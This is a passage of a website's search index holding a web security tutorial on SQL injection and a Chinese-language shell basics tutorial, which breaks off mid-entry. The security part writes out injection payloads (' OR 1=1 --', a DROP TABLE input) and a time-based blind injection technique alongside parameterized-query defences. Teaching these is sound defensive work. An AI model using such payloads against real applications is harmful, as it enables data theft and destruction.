comment any sql statement after it, and the <code>1=1</code> will always be true. So the result is: <pre><code>const { username, password } = req.body\n // { username: '\" OR 1=1 --', password: '...' }\nconst query = `SELECT * FROM users WHERE username = \"${username}\"`\n // SELECT * FROM users WHERE username = \"\" OR 1=1 --\"\nconst results = db.all(query)\n // all rows in the users table!\nif (results.length &gt; 0) {\n // will always be true!\n}\n</code></pre> The attacker will get all the user table data. How about the malicious input <code>{username: '\";drop table users --'}</code>?</p>"},{"location":"other/security/#blind-sql-injection","title":"Blind SQL injection","text":"<p>When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. The web app may be configured to show generic error messages instead of printing useful data to the user, but still vulnerable to SQL injection.</p> <p>There are two kinds of blind SQL injection. One is Content-based, if the page responds differently depending on if the query matches something or not, attacker can use this to ask \"yes or no\" questions.The other is Time-based, make the database pause for a specified amount of time when the query matches something, otherwise return immediately, different timings are observable by attacker.</p> <p>Let's take a look at Time-based sql injection. We can use a slow SQL expression, like <code>SELECT 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))</code>. Then use a SQL if-statement(CASE) to run the slow expression only when the answer to our question is <code>true</code>, like <code>SELECT CASE expression WHEN cond THEN slow ELSE speedy END</code>. Then we change the username or other things in the cond to get what is key information.</p>"},{"location":"other/security/#defenses","title":"Defenses","text":"<p>The sql injection defenses key idea is never build SQL queries with string concatenation.Instead, we can use Parameterized SQL, or use an Object Relational Mappers(ORMs).</p> <p><pre><code>// Vulnerable code:\nconst query = `SELECT * FROM users WHERE username = \"${username}\"`\nconst results = db.all(query)\n\n// Safe code:\nconst query = 'SELECT * FROM users WHERE username = ?'\nconst results = db.all(query, username)\n</code></pre> This will automatically handle escaping untrusted user input for you. ORM do this either.</p>"},{"location":"other/shell/","title":"Shell","text":""},{"location":"other/shell/#shell_1","title":"\u4ec0\u4e48\u662fshell","text":"<p>\u73b0\u4ee3\u8ba1\u7b97\u673a\u6709\u8d8a\u6765\u8d8a\u591a\u7684GUI\u7a0b\u5e8f\u3001\u8bed\u97f3\u8f93\u5165\u7a0b\u5e8f\u3001\u751a\u81f3VR\u3001AR\u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u4ea4\u4e92\u65b9\u5f0f\u80fd\u89e3\u51b3\u6211\u4eec80%\u7684\u4f7f\u7528\u573a\u666f\uff0c\u4f46\u5b83\u4eec\u8fd8\u662f\u4ece\u6839\u672c\u4e0a\u9650\u5236\u4e86\u6211\u4eec\u4f7f\u7528\u8ba1\u7b97\u673a\u7684\u65b9\u5f0f\uff0c\u4f60\u6ca1\u6cd5\u70b9\u51fb\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6309\u94ae\u3002\u4e3a\u4e86\u5145\u5206\u5229\u7528\u8ba1\u7b97\u673a\u7684\u80fd\u529b\uff0c\u6211\u4eec\u4e0d\u5f97\u4e0d\u56de\u5230\u6700\u6839\u672c\u7684\u65b9\u5f0f\uff0c\u5373\u200bshell\u3002</p> <p>\u6240\u4ee5\uff0cshell\u4e5f\u662f\u4e00\u79cd\u4ea4\u4e92\u65b9\u5f0f\uff0c\u6709\u5f88\u591a\u79cd\u7c7b\u578b\u7684shell\uff0c\u4f8b\u5982\u7cfb\u7edf\u81ea\u5e26\u7684Windows\u7684powershell\u3001Linux\u7684bash(Bourne-Again SHell)\uff0c\u8fd8\u6709\u5f00\u53d1\u8005\u7f16\u5199\u7684zsh(Z Shell)\u3001fish\u7b49\u90fd\u6bd4\u8f83\u5e38\u89c1\u3002</p>"},{"location":"other/shell/#_1","title":"\u57fa\u7840\u4f7f\u7528","text":""},{"location":"other/shell/#_2","title":"\u57fa\u7840\u6280\u5de7","text":"<p><code>$</code>\u8868\u793a\u5f53\u524d\u4e0d\u662froot\u7528\u6237\uff0c<code>#</code>\u8868\u793a\u5f53\u524d\u662froot\u7528\u6237\u3002</p> <p>\u9664\u4e86\u5185\u7f6e\u7684\u51fd\u6570\uff0cshell\u901a\u8fc7\u9012\u5f52<code>$PATH</code>\u4e2d\u7684\u76ee\u5f55\u627e\u5230\u5408\u9002\u7684\u6267\u884c\u7a0b\u5e8f: <pre><code>[ubuntu] / $ echo $PATH\n/usr/local/go/bin:/root/go/bin:/usr/local/go/bin:/root/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n[ubuntu] / $ which echo\n/bin/echo\n[ubuntu] / $ /bin/echo $PATH\n/usr/local/go/bin:/root/go/bin:/usr/local/go/bin:/root/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n</code></pre></p> <p>\u5f53\u4f20\u9012\u7684\u53c2\u6570\u5305\u542b\u7a7a\u683c\u65f6\uff0c\u5e94\u8be5\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u53cc\u5f15\u53f7\u5c06\u5176\u5305\u8d77\u6765\uff0c\u6216\u8005\u4f7f\u7528<code>\\</code>\u8f6c\u4e49\u4e00\u4e0b\uff0c\u5426\u5219\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4e24\u4e2a\u53c2\u6570: <pre><code>[ubuntu] ~ $ mkdir My Photo\n[ubuntu] ~ $ ls\nMy  Photo  go1.13.linux-amd64.tar.gz\n[ubuntu] ~ $ mkdir My\\ Photo\n[ubuntu] ~ $ ls\n My  'My Photo'   Photo   go1.13.linux-amd64.tar.gz\n</code></pre></p> <p><code>/</code>\u8868\u793a\u6839\u76ee\u5f55\uff0c<code>~</code>\u8868\u793ahome\u76ee\u5f55\uff0c<code>.</code>\u8868\u793a\u5f53\u524d\u76ee\u5f55\uff0c<code>..</code>\u8868\u793a\u4e0a\u7ea7\u76ee\u5f55\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528<code>-</code>\u6765\u5207\u6362\u76ee\u5f55: <pre><code>[ubuntu] ~ $ cd /tmp\n[ubuntu] /tmp $ cd -\n/root\n[ubuntu] ~ $ cd -\n/tmp\n</code></pre></p>"},{"location":"other/shell/#_3","title":"\u7a0b\u5e8f\u95f4\u7684\u8fde\u63a5","text":"<p>\u5728shell\u4e2d\uff0c\u7a0b\u5e8f\u90fd\u6709\u4e24\u4e2a\u4e3b\u8981\u7684\u6d41\uff0c\u5373\u8f93\u5165\u6d41\u548c\u8f93\u51fa\u6d41\u3002\u5f53\u7a0b\u5e8f\u9700\u8981\u8bfb\u53d6\u6570\u636e\u65f6\u5c31\u662f\u4ece\u8f93\u5165\u6d41\u8bfb\u53d6\uff0c\u8fd9\u901a\u5e38\u662f\u4f60\u7684\u952e\u76d8\uff1b\u5f53\u7a0b\u5e8f\u9700\u8981\u6253\u5370\u4fe1\u606f\u65f6\uff0c\u5b83\u4f1a\u5c06\u4fe1\u606f\u653e\u5728\u8f93\u51fa\u6d41\u4e2d\uff0c\u8fd9\u901a\u5e38\u662f\u4f60\u7684\u5c4f\u5e55\u3002\u7136\u800c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4fee\u6539\u9ed8\u8ba4\u7684\u8f93\u5165\u8f93\u51fa\u6d41\u3002</p> <p>\u4f8b\u5982\uff0c\u901a\u8fc7<code>&gt; file</code>\u6211\u4eec\u53ef\u4ee5\u628a\u8f93\u51fa\u6d41\u7684\u5185\u5bb9\u653e\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u901a\u8fc7<code>&lt; file</code>\u6211\u4eec\u53ef\u4ee5\u4ece\u4e00\u4e2a\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5185\u5bb9\u4f5c\u4e3a\u8f93\u5165\u6d41: <pre><code>[ubuntu] /tmp $ echo 'hello world' &gt; hello.txt\n[ubuntu] /tmp $ cat &lt; hello.txt &gt; hello2.txt\n[ubuntu] /tmp $ cat hello2.txt\nhello world\n</code></pre> \u4e5f\u53ef\u4ee5\u901a\u8fc7<code>&gt;&gt; file</code>\u628a\u8f93\u51fa\u6d41\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u6587\u4ef6\u7684\u5c3e\u90e8\uff0c\u901a\u8fc7<code>|</code>\u628a\u524d\u9762\u4e00\u4e2a\u7a0b\u5e8f\u7684\u8f93\u51fa\u4f5c\u4e3a\u540e\u4e00\u4e2a\u7a0b\u5e8f\u7684\u8f93\u5165: <pre><code>[ubuntu] /tmp $ echo 1234 &gt;&gt; hello2.txt\n[ubuntu] /tmp $ cat hello2.txt\nhello world\n1234\n[ubuntu] /tmp $ ls -l | tail -n1\ndrwx------  2 root root    4096 Dec  6  2019 tmux-0\n[ubuntu] /tmp $ ls -l | tail -n3\n-rw-r--r--  1 root root       1 Jun 15 10:13 hello3.txt\n-rwxr-xr-x  1 root root 1148709 Dec  9  2019 test\ndrwx------  2 root root    4096 Dec  6  2019 tmux-0\n</code></pre></p>"},{"location":"other/shell/#root","title":"root","text":"<p>\u5728\u5927\u591a\u6570\u7c7bUnix\u7cfb\u7edf\u4e2d\uff0c<code>root</code>\u7528\u6237\u90fd\u662f\u5f88\u7279\u6b8a\u7684\u7528\u6237\uff0c\u5b83\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u53d7\u9650\u5236\u7684\u521b\u5efa\u3001\u8bfb\u53d6\u3001\u4fee\u6539\u548c\u5220\u9664\u7cfb\u7edf\u4e2d\u7684\u4efb\u610f\u6587\u4ef6\u3002\u6240\u4ee5\u6211\u4eec\u4e3a\u907f\u514d\u5bf9\u7cfb\u7edf\u9020\u6210\u4e00\u5b9a\u7684\u7834\u574f\uff0c\u901a\u5e38\u4e0d\u4f1a\u4f7f\u7528root\u7528\u6237\u53bb\u767b\u5f55\uff0c\u53d6\u800c\u4ee3\u4e4b\u7684\u662f\u5728\u9700\u8981\u7684\u65f6\u5019\u4f7f\u7528<code>sudo</code>\u547d\u4ee4\u3002</p> <p>\u4f8b\u5982\uff0cLinux\u7cfb\u7edf\u7684\u7b14\u8bb0\u672c\u7684\u5c4f\u5e55\u4eae\u5ea6\u662f\u5199\u5728<code>/sys/class/backlight</code>\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5b83\u53ef\u4ee5\u4fee\u6539\u5c4f\u5e55\u4eae\u5ea6\uff0c\u8fd9\u5c31\u9700\u8981<code>sudo</code>\uff0c\u6211\u4eec\u53ef\u80fd\u505a\u8fd9\u6837\u7684\u5c1d\u8bd5: <pre><code>$ cd /sys/class/backlight/thinkpad_screen\n$ sudo echo 3 &gt; brightness\nAn error occurred while redirecting file 'brightness'\nopen: Permission denied\n</code></pre> \u6211\u4eec\u4f9d\u7136\u4f1a\u5f97\u5230\u9519\u8bef\u7684\u6ca1\u6709\u6743\u9650\u7684\u63d0\u793a\uff0c\u8fd9\u662f\u56e0\u4e3ashell\u4e2d<code>|</code>,<code>&gt;</code>,<code>&lt;</code>\uff0c\u5404\u4e2a\u5177\u4f53\u7684\u7a0b\u5e8f\u662f\u4e0d\u77e5\u9053\u4ed6\u4eec\u7684\u5b58\u5728\u7684\uff0cecho\u53ea\u77e5\u9053\u628a\u5185\u5bb9\u5199\u5165\u5230\u67d0\u4e2a\u8f93\u5165\u6d41\u4e2d\uff0c\u5177\u4f53\u54ea\u4e2a\u5b83\u4e0d\u77e5\u9053\uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u4f7f\u7528: <pre><code>$ echo 3 | sudo tee brightness\n</code></pre> \u8fd9\u6837\u6253\u5f00brightness\u7684\u662ftee\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e14\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u6709root\u6743\u9650\u7684\uff0c\u624d\u80fd\u6b63\u786e\u7684\u4fee\u6539\u3002</p>"},{"location":"other/shell/#_4","title":"\u7f16\u5199\u811a\u672c","text":"<p>\u5927\u591a\u6570shell\u90fd\u6709\u81ea\u5df1\u7684\u4e00\u5957\u811a\u672c\u8bed\u8a00\uff0c\u5305\u62ec\u53d8\u91cf\u3001\u63a7\u5236\u6d41\u548c\u81ea\u5df1\u7684\u8bed\u6cd5\u3002\u672c\u6587\u4e3b\u8981\u4f7f\u7528<code>bash</code>\u811a\u672c\uff0c\u5b83\u662f\u76ee\u524d\u5e94\u7528\u6700\u5e7f\u6cdb\u7684\u811a\u672c\u3002</p>"},{"location":"other/shell/#_5","title":"\u53d8\u91cf","text":"<p>\u53ef\u4ee5\u4f7f\u7528<code>foo=bar</code>\u6765\u5b9a\u4e49\u53d8\u91cffoo\uff0c\u4f46\u8981\u6ce8\u610f\u7a7a\u683c\u3002\u8f93\u51fa\u53d8\u91cf\u503c\u65f6\uff0c\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u4e5f\u6709\u533a\u522b: <pre><code>[ubuntu] /tmp/missing $ foo = bar\nbash: foo: command not found\n[ubuntu] /tmp/missing $ foo=bar\n[ubuntu] /tmp/missing $ echo 'this is $foo'\nthis is $foo\n[ubuntu] /tmp/missing $ echo \"this is $foo\"\nthis is bar\n</code></pre></p> <p>\u540c\u65f6\uff0cbash\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u53d8\u91cf: * <code>$0</code>\uff0c\u811a\u672c\u540d * <code>$1</code>\u81f3<code>$9</code>\uff0c\u811a\u672c\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570 * <code>$@</code>\uff0c\u811a\u672c\u7684\u6240\u6709\u53c2\u6570 * <code>$#</code>\uff0c\u53c2\u6570\u7684\u4e2a\u6570 * <code>$?</code>\uff0c\u524d\u4e00\u4e2a\u547d\u4ee4\u7684\u8fd4\u56de\u503c * <code>$$</code>\uff0c\u8fd4\u56de\u5f53\u524d\u811a\u672c\u7684\u8fdb\u7a0bID(PID) * <code>!!</code>\uff0c\u8868\u793a\u4e0a\u4e00\u6761\u547d\u4ee4\uff0c\u63d0\u793a\u6743\u9650\u4e0d\u8db3\u65f6\u53ef\u4ee5\u4f7f\u7528<code>sudo !!</code>\u518d\u6b21\u6267\u884c * <code>$_</code>\uff0c\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570</p> <p>\u6267\u884c\u4e00\u6761\u547d\u4ee4\u540e\uff0c\u901a\u5e38\u4f7f\u7528STDOUT\u8fd4\u56de\u8f93\u51fa\u7684\u503c\uff0cSTDERR\u8fd4\u56de\u9519\u8bef\u53ca\u9519\u8bef\u7801\uff0c\u6b63\u5e38\u6267\u884c\u7684\u9519\u8bef\u7801\u662f0\uff0c\u4e5f\u5c31\u662f<code>$?</code>\u5f97\u5230\u7684\u503c\u3002</p>"},{"location":"other/shell/#_6","title":"\u51fd\u6570","text":"<p>\u53ef\u4ee5\u5728\u4e00\u4e2a\u811a\u672c\u4e2d\u7f16\u5199\u51fd\u6570: <pre><code>mcd () {\n    mkdir -p \"$1\"\n    cd \"$1\"\n}\n</code></pre></p> <p>\u7136\u540e\u4f7f\u7528source\u5bfc\u5165\u5c31\u53ef\u4ee5\u4f7f\u7528\u8be5\u51fd\u6570: <pre><code>[ubuntu] /tmp/missing $ source ./test.sh\n[ubuntu] /tmp/missing $ mcd tt\n[ubuntu] /tmp/missing/tt $\n</code></pre></p>"},{"location":"other/shell/#_7","title":"\u547d\u4ee4\u66ff\u6362","text":"<p>\u53ef\u4ee5\u901a\u8fc7<code>$(CMD)</code>\u7684\u65b9\u5f0f\u5148\u6765\u6267\u884cCMD\uff0c\u6267\u884c\u5f97\u5230\u7684\u7ed3\u679c\u66ff\u6362\u6389$(CMD)\u3002\u4f8b\u5982\uff0c<code>for file in $(ls)</code>\u4f7fshell\u9996\u5148\u8c03\u7528ls\uff0c\u7136\u540e\u904d\u5386\u5f97\u5230\u7684\u8fd9\u4e9b\u8fd4\u56de\u503c\u3002\u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7<code>&lt;(CMD)</code>\u53bb\u5148\u6267\u884cCMD\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u8f93\u51fa\u5230\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\u4e2d\uff0c\u5e76\u5c06&lt;(CMD)\u66ff\u6362\u6210\u4e34\u65f6\u6587\u4ef6\u540d\u3002 <pre><code>[ubuntu] /tmp $ echo \"Starting program at $(date)\"\nStarting program at Wed Jun 17 16:13:34 CST 2020\n[ubuntu] /tmp $ diff &lt;(ls go) &lt;(ls missing)\n1,18c1,4\n&lt; AUTHORS\n&lt; CONTRIBUTING.md\n...\n---\n&gt; 3\n&gt; semester\n&gt; test.sh\n&gt; tt\n</code></pre></p>"},{"location":"other/shell/#_8","title":"\u63a7\u5236\u6d41","text":"<p>\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50: <pre><code>#!/bin/bash\n\necho \"Starting program at $(date)\" # Date will be substituted\n\necho \"Running program $0 with $# arguments with pid $$\"\n\nfor file in \"$@\"; do\n    grep foobar \"$file\" &gt; /dev/null 2&gt; /dev/null\n    # When pattern is not found, grep has exit status 1\n    # We redirect STDOUT and STDERR to a null register since we do not care about them\n    if [[ $? -ne 0 ]]; then\n        echo \"File $file does not have any foobar, adding one\"\n        echo \"# foobar\" &gt;&gt; \"$file\"\n    fi\ndone\n</code></pre> \u4f8b\u5982\uff0c\u8fd0\u884c<code>./test.sh a b c</code>\uff0c\u5219\u904d\u5386a\u3001b\u3001c\u4e09\u4e2a\u6587\u4ef6\uff0c\u5206\u522b\u53bb\u5bfb\u627e<code>foobar</code>\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6ca1\u627e\u5230\uff0c\u9519\u8bef\u8fd4\u56de\u503c\u5c31\u662f1\u3002\u63a5\u7740\u4f7f\u7528<code>-ne</code>\u6765\u505a\u6bd4\u8f83<code>$?</code>\u4e0d\u7b49\u4e8e0\uff0c\u5219\u628a<code># foobar</code>\u8ffd\u52a0\u5230\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u3002</p> <p>\u6ce8\u610f\uff0c\u505a\u6bd4\u8f83\u65f6\u5c3d\u91cf\u4f7f\u7528\u53cc\u65b9\u62ec\u53f7<code>[[]]</code>\uff0c\u800c\u975e\u5355\u65b9\u62ec\u53f7\uff0c\u53ef\u4ee5\u964d\u4f4e\u72af\u9519\u7684\u51e0\u7387\u3002\u5177\u4f53\u7684\u539f\u56e0\u548c\u5176\u4ed6\u6bd4\u8f83\u6761\u4ef6\u53ef\u53c2\u8003\u6b64\u6587\u7ae0\u3002</p>"},{"location":"other/shell/#_9","title":"\u901a\u914d\u7b26","text":"<p>\u5728shell\u4e2d\uff0c\u53ef\u80fd\u7ecf\u5e38\u9700\u8981\u8f93\u5165\u4e00\u6279\u7c7b\u4f3c\u7684\u53c2\u6570\uff0c\u4f8b\u5982<code>mkdir foo1 foo2 foo3</code>\u7b49\u7b49\uff0c\u5982\u679c\u6328\u4e2a\u8f93\u5165\u4f1a\u5f88\u4e0d\u65b9\u4fbf\uff0c\u56e0\u6b64\u6709\u4e86\u901a\u914d\u7b26\u3002</p> <p>\u53ef\u4ee5\u5206\u522b\u4f7f\u7528<code>?</code>\u548c<code>*</code>\u6765\u5339\u914d\u4e00\u4e2a\u6216\u4efb\u610f\u4e2a\u5b57\u7b26\uff0c\u82b1\u62ec\u53f7<code>{}</code>\u4e2d\u53ef\u4ee5\u5305\u542b\u4e00\u7cfb\u5217\u7684\u6307\u4ee4\u3002 <pre><code>[ubuntu] /tmp/missing/tt $ touch foo{1..20}.txt\n[ubuntu] /tmp/missing/tt $ ls\nfoo1.txt   foo11.txt  foo13.txt  foo15.txt  foo17.txt  foo19.txt  foo20.txt  foo4.txt  foo6.txt  foo8.txt\nfoo10.txt  foo12.txt  foo14.txt  foo16.txt  foo18.txt  foo2.txt   foo3.txt   foo5.txt  foo7.txt  foo9.txt\n[ubuntu] /tmp/missing/tt $ rm foo?\nrm: cannot remove 'foo?': No such file or directory\n[ubuntu] /tmp/missing/tt $ rm foo?.txt\n[ubuntu] /tmp/missing/tt $ ls\nfoo10.txt  foo11.txt  foo12.txt  foo13.txt  foo14.txt  foo15.txt  foo16.txt  foo17.txt  foo18.txt  foo19.txt  foo20.txt\n[ubuntu] /tmp/missing/tt $ rm foo*\n[ubuntu] /tmp/missing/tt $ ls\n[ubuntu] /tmp/missing/tt $ mkdir {foo,bar}123\n[ubuntu] /tmp/missing/tt $ ls\nbar123  foo123\n[ubuntu] /tmp/missing/tt $ touch {foo,bar}123/{a..h}\n[ubuntu] /tmp/missing/tt $ ls bar123\na  b  c  d  e  f  g  h\n</code></pre></p>"},{"location":"other/shell/#_10","title":"\u811a\u672c","text":"<p>\u811a\u672c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u8bed\u8a00\u7f16\u5199\uff0c\u53ea\u8981\u6807\u8bb0\u597d<code>shebang</code>\uff0c\u4f8b\u5982: <pre><code>#!/usr/local/bin/python\nimport sys\nfor arg in reversed(sys.argv[1:]):\n    print(arg)\n</code></pre></p> <p>\u5199\u5b8c\u4ee5\u540e\u8981\u8d4b\u4e88\u5b83\u6743\u9650\uff0c\u624d\u80fd\u6b63\u786e\u6267\u884c: <pre><code>[ubuntu] /tmp/missing/tt $ ./test.py\nbash: ./test.py: Permission denied\n[ubuntu] /tmp/missing/tt $ chmod a+x test.py\n[ubuntu] /tmp/missing/tt $ ./test.py a n cs\ncs\nn\na\n</code></pre></p> <p>\u4f46\u662f\u5176\u4ed6\u7535\u8111\u7684python\u7a0b\u5e8f\u5e76\u4e0d\u4e00\u5b9a\u4f4d\u4e8e<code>/usr/local/bin/python</code>\uff0c\u5982\u4f55\u8ba9\u8fd9\u4e2a\u811a\u672c\u901a\u7528\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u7a0b\u5e8f\u6765\u89e3\u6790\u8be5\u811a\u672c\uff0c\u5c06shebang\u4fe1\u606f\u6539\u4e3a<code>#!/usr/bin/env python</code>\u5373\u53ef\u3002</p> <p>\u6b64\u5916\uff0cshell\u51fd\u6570\u548c\u811a\u672c\u662f\u6709\u4e00\u4e9b\u4e0d\u540c\u70b9\u7684: * \u51fd\u6570\u53ea\u80fd\u7528shell\u8bed\u8a00\uff0c\u811a\u672c\u53ef\u4ee5\u7528\u4efb\u610f\u8bed\u8a00\uff0c\u53ea\u8981\u811a\u672c\u4e2d\u5305\u542bshebang\u5c31\u884c * \u51fd\u6570\u4ec5\u5728\u5b9a\u4e49\u65f6\u88ab\u52a0\u8f7d\uff0c\u811a\u672c\u662f\u5728\u6bcf\u6b21\u6267\u884c\u65f6\u52a0\u8f7d\u7684\u3002\u6240\u4ee5\u51fd\u6570\u7684\u52a0\u8f7d\u7565\u5feb\uff0c\u4f46\u6bcf\u6b21\u4fee\u6539\u5f97\u81ea\u5df1\u624b\u52a8\u91cd\u65b0\u52a0\u8f7d * \u51fd\u6570\u4f1a\u5728\u5f53\u524d\u7684shell\u73af\u5883\u4e2d\u6267\u884c\uff0c\u811a\u672c\u4f1a\u5728\u5355\u72ec\u7684\u8fdb\u7a0b\u4e2d\u6267\u884c * \u51fd\u6570\u53ef\u4ee5\u5bf9\u73af\u5883\u53d8\u91cf\u76f4\u63a5\u8fdb\u884c\u4fee\u6539\uff0c\u811a\u672c\u5219\u53ea\u80fd\u4f7f\u7528<code>export</code>\u5c06\u73af\u5883\u53d8\u91cf\u5bfc\u51fa</p> <p>\u90a3\u4e48\u4f7f\u7528<code>source script.sh</code>\u548c<code>./script.sh</code>\u6267\u884c\u811a\u672c\u6709\u4ec0\u4e48\u533a\u522b\u5462\uff1f \u5b9e\u9645\u4e0a\u4f7f\u7528source\u547d\u4ee4\u662f\u5728\u5f53\u524dshell\u7684session\u4e2d\u6267\u884c\u811a\u672c\uff0c\u8be5\u811a\u672c\u4e2d\u6267\u884c\u7684\u4efb\u4f55\u5bf9\u5f53\u524d\u73af\u5883\u7684\u66f4\u6539\u90fd\u4f1a\u7559\u5b58\u5728\u5f53\u524d\u4f1a\u8bdd\u4e2d\uff1b\u800c\u5982\u679c\u76f4\u63a5\u6267\u884c./script.sh\u7684\u8bdd\uff0c\u5f53\u524d\u7684shell\u4f1a\u65b0\u5efa\u4e00\u4e2a\u65b0\u7684session\uff0c\u5e76\u5728\u8be5session\u4e2d\u6267\u884c\u547d\u4ee4\uff0c\u6267\u884c\u5b8c\u6210\u540e\u5bf9\u539fsession\u6ca1\u6709\u5f71\u54cd\u3002</p>"},{"location":"other/shell/#_11","title":"\u4efb\u52a1\u63a7\u5236","text":"<p>shell\u4f7f\u7528UNIX\u63d0\u4f9b\u7684\u4fe1\u53f7\u673a\u5236\u6765\u6267\u884c\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u63a5\u6536\u5230\u4fe1\u53f7\u65f6\uff0c\u5b83\u4f1a\u505c\u6b62\u6267\u884c\u3001\u5904\u7406\u8be5\u4fe1\u53f7\u5e76\u57fa\u4e8e\u4fe1\u53f7\u4f20\u9012\u7684\u4fe1\u606f\u6765\u6539\u53d8\u5176\u6267\u884c\uff0c\u6240\u4ee5\u4fe1\u53f7\u76f8\u5f53\u4e8e\u662f\u8f6f\u4ef6\u4e2d\u65ad\u3002</p> <p>\u4f8b\u5982\u5f53\u6211\u4eec\u5728\u952e\u76d8\u4e0a\u8f93\u5165<code>Ctrl-C</code>\u65f6\uff0cshell\u4f1a\u53d1\u9001\u4e00\u4e2a<code>SIGINT</code>\u4fe1\u53f7\u5230\u8fdb\u7a0b\uff0c\u6765\u7ec8\u6b62\u8fd9\u4e2a\u7a0b\u5e8f\u3002\u5f53\u7136\uff0c\u8fdb\u7a0b\u4e2d\u662f\u53ef\u4ee5\u6355\u83b7\u4fe1\u53f7\u53bb\u505a\u522b\u7684\u5904\u7406\u7684\uff0c\u4f8b\u5982: sigint.py<pre><code>#!/usr/bin/env python\nimport signal, time\n\ndef handler(signum, time):\n    print(\"\\nI got a SIGINT, but I am not stopping\")\n\nsignal.signal(signal.SIGINT, handler)\ni = 0\nwhile True:\n    time.sleep(.1)\n    print(\"\\r{}\".format(i), end=\"\")\n    i += 1\n</code></pre> \u6b64\u65f6\uff0c\u6211\u4eec\u901a\u8fc7<code>Ctrl-C</code>\u5c31\u5df2\u7ecf\u65e0\u6cd5\u7ec8\u6b62\u8be5\u7a0b\u5e8f\u4e86: <pre><code>$ python sigint.py\n24^C\nI got a SIGINT, but I am not stopping\n26^C\nI got a SIGINT, but I am not stopping\n30^\\[1]    39913 quit       python sigint.py\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u5176\u4ed6\u4e2d\u65ad\u4fe1\u53f7\u6765\u505c\u6b62\u8be5\u7a0b\u5e8f\uff0c\u4f8b\u5982<code>SIGQUIT</code>\u6216<code>SIGTERM</code>\u7b49\u3002\u90a3\u4e48\u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u6355\u83b7\u4e86\u6240\u6709\u7684\u4fe1\u53f7\uff0c\u662f\u4e0d\u662f\u5b83\u5c31\u65e0\u6cd5\u88ab\u5916\u90e8\u505c\u6b62\u4e86\uff1f\u5b9e\u9645\u4e0a\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u4fe1\u53f7<code>SIGKILL</code>\u662f\u65e0\u6cd5\u88ab\u6355\u83b7\u7684\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528\u7684<code>kill -9 &lt;pid&gt;</code>\u53d1\u51fa\u7684\u4fe1\u53f7\u3002</p> <p>\u901a\u8fc7<code>man signal</code>\u80fd\u67e5\u770b\u5230\u4fe1\u53f7\u7684\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c<code>kill -l</code>\u663e\u793a\u51fa\u4fe1\u53f7\u5217\u8868\uff0c\u7136\u540e<code>kill -&lt;\u4fe1\u53f7\u540d\u79f0&gt; &lt;pid&gt;</code>\u53d1\u9001\u67d0\u4e2a\u4fe1\u53f7\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u52a0\u4e00\u4e2a\u540e\u7f00<code>&amp;</code>\u6765\u8ba9\u8be5\u547d\u4ee4\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u7136\u540e\u901a\u8fc7<code>jobs</code>\u547d\u4ee4\u80fd\u5217\u51fa\u5f53\u524dshell\u4f1a\u8bdd\u4e2d\u672a\u5b8c\u6210\u7684\u5168\u90e8\u4efb\u52a1\u3002\u4f46\u540e\u53f0\u8fdb\u7a0b\u4ecd\u7136\u662f\u5f53\u524d\u7ec8\u7aef\u4f1a\u8bdd\u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0b\uff0c\u4e00\u65e6\u5173\u95ed\u7ec8\u7aef\u5c31\u4f1a\u53d1\u9001\u4e00\u4e2a\u4fe1\u53f7<code>SIGHUP</code>\u5bfc\u81f4\u8fd9\u4e9b\u540e\u53f0\u7684\u8fdb\u7a0b\u88ab\u7ec8\u6b62\u6389\uff0c\u547d\u4ee4\u524d\u52a0<code>nohup</code>\u5c31\u662f\u7528\u6765\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u7684\u3002 <pre><code>$ sleep 1000\n^Z      # \u4f7f\u7528ctrl+Z\u53d1\u9001\u4e86\u4e00\u4e2aSIGTSTP\u4fe1\u53f7\u4ece\u800c\u6682\u505c\u4e86\u4efb\u52a1\n[1]  + 18653 suspended  sleep 1000\n\n$ nohup sleep 2000 &amp;\n[2] 18745\nappending output to nohup.out\n\n$ jobs\n[1]  + suspended  sleep 1000\n[2]  - running    nohup sleep 2000\n\n$ bg %1     # 